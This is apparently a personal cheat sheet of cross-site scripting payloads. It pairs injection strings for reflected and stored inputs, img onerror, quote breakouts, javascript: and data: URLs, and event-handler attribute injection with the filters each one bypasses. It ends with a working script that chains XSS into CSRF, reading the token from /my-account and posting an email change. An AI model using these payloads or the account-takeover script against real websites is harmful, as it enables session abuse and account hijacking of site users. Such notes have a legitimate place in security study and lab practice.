the input directly gets reflected                          -- <script>alert('xss')</script>
the input directly gets stored and <script> is filtered   --- <img src=x onerror=alert('XSS')>
the input is part of url for <img> tag
<img src="cloud$var.jpg">                                 --- ' onerror='alert("xss")'> (in this case a single quote breaks out of url)

the input is part of <a> tag                              --- javascript:alert()
when the input is url and its content is used in JS       --- data:application/javascript,alert()  (use data url data:{type}/content)
but filters http/https:

:::html
<script>alert(document.domain);</script>                 ---- when the input is in widget

123" onmouseover="alert(document.domain);                     when < and > are encoded as &lt and &gt use this payload
a onmouseover=alert(document.domain);                         when the server side escapes quotes 
use a acnein to check whether additional attributes can be added.


XSS to CSRF --- 
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
If single quotes and backslashes are escaped try -- injecting </script> to close the exisiting script tag or any other tag.
